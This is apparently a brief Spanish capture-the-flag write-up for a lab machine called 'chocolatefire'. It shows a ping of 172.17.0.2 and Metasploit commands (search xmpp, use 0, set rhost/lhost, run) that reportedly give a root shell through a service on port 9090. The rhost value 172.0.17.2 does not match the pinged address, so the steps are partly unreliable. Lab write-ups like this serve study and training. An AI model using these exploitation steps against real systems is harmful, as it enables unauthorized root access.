# chocolatefire

```
ping -c 1 172.17.0.2     
```

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data. 64 bytes from 172.17.0.2: icmp\_seq=1 ttl=64 time=0.390 ms

\--- 172.17.0.2 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.390/0.390/0.390/0.000 ms

viendo los puertos que hay abiertos se identifica un servicio xmpp con puerto 9090 el cual mediante metasploit hemos conseguido entrar y directamente nos ha dado una consola como el usuario root

```
search xmpp
```

```
use 0
```

```
set rhost 172.0.17.2
```

```
set lhost 172.0.1.1
```

```
run 
```
